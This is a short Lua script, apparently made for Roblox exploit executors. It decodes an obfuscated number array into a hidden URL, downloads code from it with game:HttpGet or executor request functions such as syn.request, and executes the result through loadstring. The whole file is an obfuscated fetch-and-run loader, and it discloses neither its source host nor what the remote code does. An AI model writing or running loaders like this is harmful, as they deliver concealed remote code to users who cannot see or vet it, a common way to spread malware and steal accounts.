local function _d(t,k)local r={}for i=1,#t do r[i]=string.char(((t[i]-k-(i*19)-41)%256+256)%256)end return table.concat(r)end
local _u=_d({65,96,115,130,152,114,122,141,228,242,248,21,34,52,68,105,113,126,158,163,199,204,169,254,2,45,51,66,79,114,130,149,103,195,206,228,240,253,29,49,255,72,92,128,76,166,117,133,202},157)
local _f=(loadstring or load)
local _ok,_s=pcall(function()return game:HttpGet(_u,true)end)
if not _ok or type(_s)~="string" or #_s<8 then local _r=(getgenv and (getgenv().http_request or getgenv().request))or http_request or request or (syn and syn.request) if _r then local _x=_r({Url=_u,Method="GET"}) _s=_x and (_x.Body or _x.body) end end
if _f and type(_s)=="string" and #_s>0 then return _f(_s)() end
